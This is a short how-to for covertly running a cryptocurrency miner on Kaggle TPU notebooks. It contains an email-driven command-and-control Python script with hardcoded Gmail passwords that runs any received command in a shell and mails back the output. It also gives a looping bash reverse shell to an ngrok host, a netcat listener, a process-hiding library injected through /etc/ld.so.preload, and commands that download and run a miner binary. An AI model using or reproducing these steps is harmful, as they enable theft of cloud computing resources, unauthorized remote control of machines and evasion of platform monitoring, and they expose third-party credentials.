# miner
TPU 96 Core https://www.kaggle.com/
register with gmail
verify phone number format : 081245754875
run code:
====================================>

import imaplib
import email
import smtplib
import subprocess
import time

# email account details
imap_username_from_client = "brunobrail335@gmail.com"
imap_password = "dimgwmkmtwsiaaiw"
smtp_username = "duejohn825@gmail.com"
smtp_password = "vekktzscbyhfvadv"
imap_server="imap.gmail.com"

while True:
    try:

        imap = imaplib.IMAP4_SSL(imap_server)
        imap.login(imap_username_from_client, imap_password)
        imap.select("inbox")
        status, messages = imap.search(None, "UNSEEN")
        if messages[0]:
            latest_message = messages[0].split()[-1]
            _, msg = imap.fetch(latest_message, "(RFC822)")
            email_message = email.message_from_bytes(msg[0][1])
            for part in email_message.walk():
                if part.get_content_type() == "text/plain":
                    body = part.get_payload(decode=True).decode()
                    result_byte = (
                        subprocess.run(body, shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE).stdout).decode(
                        'utf-8')
                    break
            msg = email.message.EmailMessage()
            msg.set_content(result_byte)
            msg['Subject'] = 'Result of command'
            msg['From'] = imap_username_from_client
            msg['To'] = smtp_username

            # send email with result
            with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                smtp.starttls()
                smtp.login(smtp_username, smtp_password)
                smtp.send_message(msg)
        imap.close()
        imap.logout()
    except Exception as e:
        print(f"Error: {e}")

    # wait for 10 seconds before checking for new messages again
    time.sleep(2)
================================>
acces clinet  ==============> wget https://raw.githubusercontent.com/bulboni/minware/main/svr.py
create reverse shell ========> while true; do bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10187 0>&1'; sleep 10; done
call net cat ================> nc -lnvp 4444
undo dyrectory kagle ==============> cd /kaggle
hide miner ========================> git clone https://github.com/cihuuy/libn && cd libn && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
call miner =========================> wget https://raw.githubusercontent.com/bulboni/minware/main/config.json && wget https://raw.githubusercontent.com/bulboni/minware/main/durex && chmod +x durex && ./durex
